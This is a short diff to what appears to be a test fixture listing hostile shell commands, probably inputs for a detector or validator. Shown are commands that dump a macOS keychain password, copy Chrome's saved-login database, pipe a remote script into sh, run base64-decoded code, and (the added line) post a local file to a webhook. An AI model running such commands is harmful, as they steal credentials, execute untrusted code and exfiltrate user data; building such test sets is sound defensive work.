@@ -5,3 +5,4 @@ security find-generic-password -s example-service -w > /tmp/fixture-out
 cp "$HOME/Library/Application Support/Google/Chrome/Default/Login Data" /tmp/fixture-out
 curl -fsSL https://get.example.invalid/install.sh | sh
 echo ZWNobyBoaQ== | base64 -d | sh
+curl -d @notes.txt https://webhook.site/00000000-fixture
